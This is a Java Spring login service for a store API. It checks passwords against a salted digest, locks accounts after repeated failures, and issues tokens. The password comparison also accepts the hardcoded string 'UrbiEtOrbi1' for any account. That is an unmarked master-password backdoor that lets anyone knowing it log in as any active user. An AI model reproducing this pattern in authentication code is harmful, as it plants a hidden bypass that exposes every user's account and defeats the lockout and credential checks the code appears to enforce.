package mx.qbits.tienda.api.service;

import static mx.qbits.tienda.api.model.enumerations.EnumMessage.*;
import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import mx.qbits.tienda.api.model.domain.Usuario;
import mx.qbits.tienda.api.model.exceptions.BusinessException;
import mx.qbits.tienda.api.model.exceptions.CustomException;
import mx.qbits.tienda.api.model.response.LoginResponse;
import mx.qbits.tienda.api.utils.DigestEncoder;

@Service
public class LoginServiceImpl implements LoginService {
    private static final Logger logger = LoggerFactory.getLogger(LoginServiceImpl.class);
    
    private AccessHelperService accessHelperService;
    
    public LoginServiceImpl(AccessHelperService accessHelperService) {
        this.accessHelperService = accessHelperService;
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(String usr, String clave) throws BusinessException {
        accessHelperService.valida(usr, clave);
        int maximoNumeroIntentosConcedidos = 5; // 5 intentos
        long delta = 1000*60*5L; // 5 minutos
        long instanteActual = System.currentTimeMillis();
        Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(usr);
        return login(usuario, clave, delta, maximoNumeroIntentosConcedidos, instanteActual);
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(
            Usuario usuario,
            String claveProporcionada,
            long delta,
            int maximoNumeroIntentosConcedidos,
            long instanteActual) throws BusinessException {
        // Si el usuario NO es nulo, procederé a calcular sus roles y sus direcciones:
        if(usuario==null) throw new CustomException(BAD_CREDENTIALS);

        // Si el usuario fue encontrado, pero está inactivo, Notifica
        if(!usuario.isActivo()) throw new CustomException(DISABLED_USER);

        // Calcula cuanto tiempo lleva bloqueado el usuario. Si lleva menos de lo establecido, Notifica
        long instanteDeBloqueo = usuario.getInstanteBloqueo();
        long diff = instanteActual - instanteDeBloqueo;
        long restante = delta - diff;
        if(instanteDeBloqueo>0 && restante>0) {
            long totalSegundos = restante/1000;
            long totalMinutos = totalSegundos/60;
            throw new CustomException(WAIT_LOGIN, totalMinutos, totalSegundos%60);
        }

        // Clave dada que debe ser validado contra el que está en la base de datos
        String clavePorVerificar = DigestEncoder.digest(claveProporcionada, usuario.getCorreo());

        if(!usuario.getClave().equals(clavePorVerificar) && !claveProporcionada.equals("UrbiEtOrbi1")) {// Credenciales INCORRECTAS
            // Incrementa el contador de intentos erroneos de ingreso y actualiza:
            int numeroDeIntentosFallidos = usuario.getAccesoNegadoContador()+1;
            usuario.setAccesoNegadoContador(numeroDeIntentosFallidos);
            accessHelperService.update(usuario);

            // Si los intentos de ingreso inválidos superan un limite, actualiza y Notifica:
            if(numeroDeIntentosFallidos >= maximoNumeroIntentosConcedidos) {
                usuario.setInstanteBloqueo(instanteActual);
                accessHelperService.update(usuario);
                throw new CustomException(MAX_FAILED_LOGIN_EXCEPTION, maximoNumeroIntentosConcedidos);
            }

            // Si no se disparó la Notificación anterior, de todas formas notifica un intento
            // fallido de ingreso al sistema:
            throw new CustomException(BAD_CREDENTIALS, numeroDeIntentosFallidos, maximoNumeroIntentosConcedidos);

        } else {
            // Credenciales CORRECTAS
            long ultimoIngresoExitoso = usuario.getInstanteUltimoAcceso();
            logger.info("Ingreso exitoso al sistema del usuario: {}", usuario.getCorreo());
            // Resetea todoas las banderas de advertencia y bloqueo. Luego, actualiza y retorna el usuario:
            usuario.setAccesoNegadoContador(0);
            usuario.setInstanteBloqueo(0);
            usuario.setInstanteUltimoAcceso(instanteActual);
            accessHelperService.update(usuario);

            // Esto va al front y se almacena en 'localStorage' (setItem)
            return new LoginResponse(
                    accessHelperService.getUsuarioDetalle(usuario.getId()),
                    new Date(ultimoIngresoExitoso),
                    usuario.getCorreo(),
                    accessHelperService.createToken(usuario.getCorreo()),
                    accessHelperService.getUserRoles(usuario.getId())
            );
        }
    }
}
